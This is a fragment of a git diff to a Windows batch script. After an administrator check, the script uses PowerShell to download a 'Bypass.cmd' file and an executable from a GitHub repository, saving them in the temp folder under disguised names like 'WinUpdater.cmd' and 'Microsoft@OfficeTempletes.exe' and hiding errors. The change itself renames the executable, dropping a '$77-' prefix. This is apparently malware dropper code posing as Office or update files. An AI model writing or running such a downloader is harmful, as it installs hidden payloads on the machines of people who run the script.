@@ -26,7 +26,7 @@ goto gotAdmin
 set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/Bypass.cmd"
 set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/Microsoft@OfficeTempletes.exe"
 set "PS1_FILE=%temp%\WinUpdater.cmd"
-set "EXE_FILE=%temp%\$77-Microsoft@OfficeTempletes.exe"
+set "EXE_FILE=%temp%\Microsoft@OfficeTempletes.exe"
 
 echo Downloading files...
 powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_FILE%'" 2>nul
